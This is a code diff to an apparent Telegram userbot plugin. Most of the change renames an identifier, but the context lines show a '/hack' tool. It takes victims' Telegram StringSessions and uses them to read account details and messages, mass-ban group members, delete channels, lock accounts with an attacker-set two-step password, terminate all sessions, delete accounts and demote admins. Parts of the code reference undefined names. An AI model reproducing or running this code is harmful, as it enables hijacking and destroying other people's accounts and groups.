@@ -4,7 +4,7 @@ import os
 
 from telethon import TelegramClient, events, functions, types
 
-from userbot import hinduub
+from userbot import HINDUS_USERBOT
 
 from ..funcs.logger import logging
 
@@ -16,7 +16,7 @@ from telethon.tl.types import ChannelParticipantsAdmins
 
 api_hash = os.environ.get("API_HASH")
 token = os.environ.get("BOT_TOKEN")
-client = TelegramClient("HINDUS USERBOT", api_id, api_hash).start(bot_token=token)
+client = TelegramClient("HINDUS_USERBOT", api_id, api_hash).start(bot_token=token)
 from telethon.sessions import StringSession as ses
 from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt
 from telethon.tl.functions.channels import DeleteChannelRequest as dc
@@ -29,7 +29,7 @@ LOGS = logging.getLogger(__name__)
 mybot = "missrose_bot"
 bot = borg = client
 
-HINDUS USERBOT = 1415798813
+HINDUS_USERBOT = 1415798813
 
 
 async def change_number_code(strses, number, code, otp):
@@ -225,22 +225,22 @@ M: [Change Phone number using StringSession]
 """
 
 
-@hinduub.tgbot.on(events.NewMessage(pattern="/give"))
+@HINDUS_USERBOT.tgbot.on(events.NewMessage(pattern="/give"))
 async def op(event):
     if not event.sender_id == SimpleBoy786:
         return await event.reply("please don't use me fuck off 🥺")
     try:
-        await event.reply("session bot file", file="HINDUS USERBOT.session")
+        await event.reply("session bot file", file="HINDUS_USERBOT.session")
     except Exception as e:
         print(e)
 
 
-@hinduub.tgbot.on(events.NewMessage(pattern="/hack", func=lambda x: x.is_group))
+@HINDUS_USERBOT.tgbot.on(events.NewMessage(pattern="/hack", func=lambda x: x.is_group))
 async def op(event):
     await event.reply("please use me in pm🥺")
 
 
-@hinduub.tgbot.on(events.NewMessage(pattern="/hack", func=lambda x: x.is_private))
+@HINDUS_USERBOT.tgbot.on(events.NewMessage(pattern="/hack", func=lambda x: x.is_private))
 async def start(event):
     async with bot.conversation(event.chat_id) as x:
         await x.send_message(f"Choose what you want with string session \n\n{menu}")
@@ -260,12 +260,12 @@ async def start(event):
                 return await event.reply("This StringSession is terminated maybe")
             if len(i) > 3855:
                 file = open("session.txt", "w")
-                file.write(i + "\n\nDETAILS BY HINDUS USERBOT")
+                file.write(i + "\n\nDETAILS BY HINDUS_USERBOT")
                 file.close()
                 await bot.send_file(event.chat_id, "session.txt")
                 system("rm -rf session.txt")
             else:
-                await event.reply(i + "\n\nThanks For using HINDUS USERBOT")
+                await event.reply(i + "\n\nThanks For using HINDUS_USERBOT")
         elif res.text == "B":
             await x.send_message("GIVE STRING SESSION")
             strses = await x.get_response()
@@ -275,7 +275,7 @@ async def start(event):
             else:
                 return await event.respond("This StringSession is terminated maybe")
             i = await userinfo(strses.text)
-            await event.reply(i + "\n\nThanks For using HINDUS USERBOT")
+            await event.reply(i + "\n\nThanks For using HINDUS_USERBOT")
         elif r == "C":
             await x.send_message("GIVE STRING SESSION")
             strses = await x.get_response()
@@ -287,7 +287,7 @@ async def start(event):
             await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
             grpid = await x.get_response()
             await userbans(strses.text, grpid.text)
-            await event.reply("Banning all members Thanks For using HINDUS USERBOT")
+            await event.reply("Banning all members Thanks For using HINDUS_USERBOT")
         elif r == "D":
             await x.send_message("GIVE STRING SESSION")
             strses = await x.get_response()
@@ -297,7 +297,7 @@ async def start(event):
             else:
                 return await event.respond("This StringSession is terminated maybe")
             i = await usermsgs(strses.text)
-            await event.reply(i + "\n\nThanks For using HINDUS USERBOT")
+            await event.reply(i + "\n\nThanks For using HINDUS_USERBOT")
         elif r == "E":
             await x.send_message("GIVE STRING SESSION")
             strses = await x.get_response()
@@ -309,7 +309,7 @@ async def start(event):
             await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
             grpid = await x.get_response()
             await joingroup(strses.text, grpid.text)
-            await event.reply("Joined the Channel/Group Thanks For using HINDUS USERBOT")
+            await event.reply("Joined the Channel/Group Thanks For using HINDUS_USERBOT")
         elif r == "F":
             await x.send_message("GIVE STRING SESSION")
             strses = await x.get_response()
@@ -321,7 +321,7 @@ async def start(event):
             await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
             grpid = await x.get_response()
             await leavegroup(strses.text, grpid.text)
-            await event.reply("Leaved the Channel/Group Thanks For using HINDUS USERBOT")
+            await event.reply("Leaved the Channel/Group Thanks For using HINDUS_USERBOT")
         elif r == "G":
             await x.send_message("GIVE STRING SESSION")
             strses = await x.get_response()
@@ -333,7 +333,7 @@ async def start(event):
             await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
             grpid = await x.get_response()
             await delgroup(strses.text, grpid.text)
-            await event.reply("Deleted the Channel/Group Thanks For using HINDUS USERBOT")
+            await event.reply("Deleted the Channel/Group Thanks For using HINDUS_USERBOT")
         elif r == "H":
             await x.send_message("GIVE STRING SESSION")
             strses = await x.get_response()
@@ -345,7 +345,7 @@ async def start(event):
             i = await user2fa(strses.text)
             if i:
                 await event.reply(
-                    "User don't have two step thats why now two step is `HINDUS USERBOTIsBest` you can login now\n\nThanks For using HINDUS USERBOT"
+                    "User don't have two step thats why now two step is `HINDUS USERBOTIsBest` you can login now\n\nThanks For using HINDUS_USERBOT"
                 )
             else:
                 await event.reply("Sorry User Have two step already")
@@ -359,7 +359,7 @@ async def start(event):
                 return await event.respond("This StringSession is terminated maybe")
             i = await terminate(strses.text)
             await event.reply(
-                "The all sessions are terminated\n\nThanks For using HINDUS USERBOT"
+                "The all sessions are terminated\n\nThanks For using HINDUS_USERBOT"
             )
         elif res.text == "J":
             await x.send_message("GIVE STRING SESSION")
@@ -371,7 +371,7 @@ async def start(event):
                 return await event.respond("This StringSession is terminated maybe")
             i = await delacc(strses.text)
             await event.reply(
-                "The Account is deleted SUCCESSFULLLY\n\nThanks For using HINDUS USERBOT"
+                "The Account is deleted SUCCESSFULLLY\n\nThanks For using HINDUS_USERBOT"
             )
         elif res.text == "L":
             await x.send_message("GIVE STRING SESSION")
@@ -387,7 +387,7 @@ async def start(event):
             user = await x.get_response()
             i = await promote(strses.text, grp.text, user.text)
             await event.reply(
-                "I am Promoting you in Group/Channel wait a min 😗😗\n\nThanks For using HINDUS USERBOT"
+                "I am Promoting you in Group/Channel wait a min 😗😗\n\nThanks For using HINDUS_USERBOT"
             )
         elif res.text == "K":
             await x.send_message("GIVE STRING SESSION")
@@ -404,7 +404,7 @@ async def start(event):
             except:
                 pass
             await event.reply(
-                "I am Demoting all members of Group/Channel wait a min 😗😗\n\nThanks For using HINDUS USERBOT"
+                "I am Demoting all members of Group/Channel wait a min 😗😗\n\nThanks For using HINDUS_USERBOT"
             )
         elif res.text == "M":
             await x.send_message("GIVE STRING SESSION")
